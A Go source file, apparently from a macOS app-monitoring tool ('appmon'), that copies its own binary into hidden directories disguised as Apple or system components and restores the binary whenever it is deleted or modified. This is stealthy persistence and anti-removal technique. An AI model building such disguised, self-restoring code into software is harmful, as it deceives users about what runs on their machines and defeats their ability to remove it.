package infra

import (
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

// BackupConfig stores information about binary backups
type BackupConfig struct {
	MainBinaryPath string   `json:"main_binary_path"`
	SHA256         string   `json:"sha256"`
	BackupPaths    []string `json:"backup_paths"`
	PlistPath      string   `json:"plist_path"`
	Version        string   `json:"version"`
	BuildTime      string   `json:"build_time"`
}

// BackupManager handles binary self-replication and restoration
type BackupManager struct {
	homeDir    string
	configPath string
}

// NewBackupManager creates a new backup manager
func NewBackupManager() *BackupManager {
	home, _ := os.UserHomeDir()
	return NewBackupManagerWithHome(home)
}

// NewBackupManagerWithHome creates a backup manager with custom home directory (for testing)
func NewBackupManagerWithHome(home string) *BackupManager {
	// Hidden config location - obfuscated name
	hostname, _ := os.Hostname()
	hash := md5.Sum([]byte("appmon-backup-cfg-" + hostname))
	configDir := filepath.Join(home, ".config", ".com.apple.preferences."+hex.EncodeToString(hash[:])[:6])

	return &BackupManager{
		homeDir:    home,
		configPath: filepath.Join(configDir, ".helper.json"),
	}
}

// getBackupLocations returns obfuscated backup directory paths
func (bm *BackupManager) getBackupLocations() []string {
	hostname, _ := os.Hostname()

	// Generate different hashes for different locations
	hash1 := md5.Sum([]byte("appmon-bk1-" + hostname))
	hash2 := md5.Sum([]byte("appmon-bk2-" + hostname))
	hash3 := md5.Sum([]byte("appmon-bk3-" + hostname))

	return []string{
		// Hidden in .config
		filepath.Join(bm.homeDir, ".config", ".com.apple.helper."+hex.EncodeToString(hash1[:])[:8]),
		// Hidden in .local/share
		filepath.Join(bm.homeDir, ".local", "share", ".system.cache."+hex.EncodeToString(hash2[:])[:8]),
		// Hidden in /var/tmp
		filepath.Join("/var/tmp", ".cf_service_"+hex.EncodeToString(hash3[:])[:8]),
	}
}

// SetupBackups copies the current binary to backup locations
func (bm *BackupManager) SetupBackups(mainBinaryPath, version, buildTime string) error {
	// Compute SHA256 of main binary
	sha, err := computeSHA256(mainBinaryPath)
	if err != nil {
		return fmt.Errorf("failed to compute SHA256: %w", err)
	}

	backupPaths := bm.getBackupLocations()
	successfulBackups := []string{}

	// Copy to each backup location
	for _, backupDir := range backupPaths {
		// Create directory
		if err := os.MkdirAll(backupDir, 0700); err != nil {
			continue // Try next location
		}

		// Binary name is also obfuscated
		backupPath := filepath.Join(backupDir, ".helper")

		if err := copyFile(mainBinaryPath, backupPath); err != nil {
			continue
		}

		// Make executable
		_ = os.Chmod(backupPath, 0700)
		successfulBackups = append(successfulBackups, backupPath)
	}

	if len(successfulBackups) == 0 {
		return fmt.Errorf("failed to create any backups")
	}

	// Save config
	config := BackupConfig{
		MainBinaryPath: mainBinaryPath,
		SHA256:         sha,
		BackupPaths:    successfulBackups,
		PlistPath:      filepath.Join(bm.homeDir, "Library/LaunchAgents/com.focusd.appmon.plist"),
		Version:        version,
		BuildTime:      buildTime,
	}

	return bm.saveConfig(config)
}

// GetConfig loads the backup configuration
func (bm *BackupManager) GetConfig() (*BackupConfig, error) {
	data, err := os.ReadFile(bm.configPath)
	if err != nil {
		return nil, err
	}

	var config BackupConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

// saveConfig writes config to hidden location
func (bm *BackupManager) saveConfig(config BackupConfig) error {
	// Ensure config directory exists
	configDir := filepath.Dir(bm.configPath)
	if err := os.MkdirAll(configDir, 0700); err != nil {
		return err
	}

	data, err := json.Marshal(config)
	if err != nil {
		return err
	}

	return os.WriteFile(bm.configPath, data, 0600)
}

// VerifyAndRestore checks binary integrity and restores if needed
func (bm *BackupManager) VerifyAndRestore() (restored bool, err error) {
	config, err := bm.GetConfig()
	if err != nil {
		return false, fmt.Errorf("no backup config found: %w", err)
	}

	// Check if main binary exists
	if _, statErr := os.Stat(config.MainBinaryPath); os.IsNotExist(statErr) {
		// Binary MISSING → restore from backup
		return bm.restoreFromBackup(config)
	}

	// Binary exists - check SHA256
	currentSHA, err := computeSHA256(config.MainBinaryPath)
	if err != nil {
		// Can't compute SHA → try to restore
		return bm.restoreFromBackup(config)
	}

	if currentSHA == config.SHA256 {
		// SHA matches → all good
		return false, nil
	}

	// SHA mismatch - check if it's a legitimate update by comparing versions
	currentVersion, err := bm.queryBinaryVersion(config.MainBinaryPath)
	if err != nil {
		// Can't query version → assume corruption, restore
		return bm.restoreFromBackup(config)
	}

	// Compare versions
	if isNewerVersion(currentVersion, config.Version) {
		// Newer version → legitimate update, update backups
		return false, bm.SetupBackups(config.MainBinaryPath, currentVersion, "")
	}

	// Same or older version with different SHA → corruption, restore
	return bm.restoreFromBackup(config)
}

// restoreFromBackup restores the main binary from a valid backup
func (bm *BackupManager) restoreFromBackup(config *BackupConfig) (bool, error) {
	for _, backupPath := range config.BackupPaths {
		backupSHA, err := computeSHA256(backupPath)
		if err != nil || backupSHA != config.SHA256 {
			continue // This backup is corrupted
		}

		// Found good backup, restore it
		_ = os.MkdirAll(filepath.Dir(config.MainBinaryPath), 0755)

		if err := copyFile(backupPath, config.MainBinaryPath); err != nil {
			continue
		}
		_ = os.Chmod(config.MainBinaryPath, 0755)
		return true, nil
	}
	return false, fmt.Errorf("all backups corrupted or missing")
}

// queryBinaryVersion runs the binary with "version --json" to get its version
func (bm *BackupManager) queryBinaryVersion(binaryPath string) (string, error) {
	cmd := exec.Command(binaryPath, "version", "--json")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to query version: %w", err)
	}

	var info struct {
		Version string `json:"version"`
	}
	if err := json.Unmarshal(output, &info); err != nil {
		return "", fmt.Errorf("failed to parse version: %w", err)
	}
	return info.Version, nil
}

// isNewerVersion compares two semver strings, returns true if current > stored
// Simple comparison: splits by "." and compares each part numerically
func isNewerVersion(current, stored string) bool {
	if stored == "" {
		return true // No stored version → treat current as newer
	}

	currentParts := strings.Split(current, ".")
	storedParts := strings.Split(stored, ".")

	// Compare each part
	maxLen := len(currentParts)
	if len(storedParts) > maxLen {
		maxLen = len(storedParts)
	}

	for i := 0; i < maxLen; i++ {
		var currentNum, storedNum int

		if i < len(currentParts) {
			currentNum, _ = strconv.Atoi(currentParts[i])
		}
		if i < len(storedParts) {
			storedNum, _ = strconv.Atoi(storedParts[i])
		}

		if currentNum > storedNum {
			return true
		}
		if currentNum < storedNum {
			return false
		}
	}

	return false // Equal versions
}

// GetMainBinaryPath returns the configured main binary path
func (bm *BackupManager) GetMainBinaryPath() string {
	config, err := bm.GetConfig()
	if err != nil {
		// Default location if no config
		return filepath.Join(bm.homeDir, ".local", "bin", "appmon")
	}
	return config.MainBinaryPath
}

// computeSHA256 calculates SHA256 hash of a file
func computeSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}

	return hex.EncodeToString(h.Sum(nil)), nil
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}
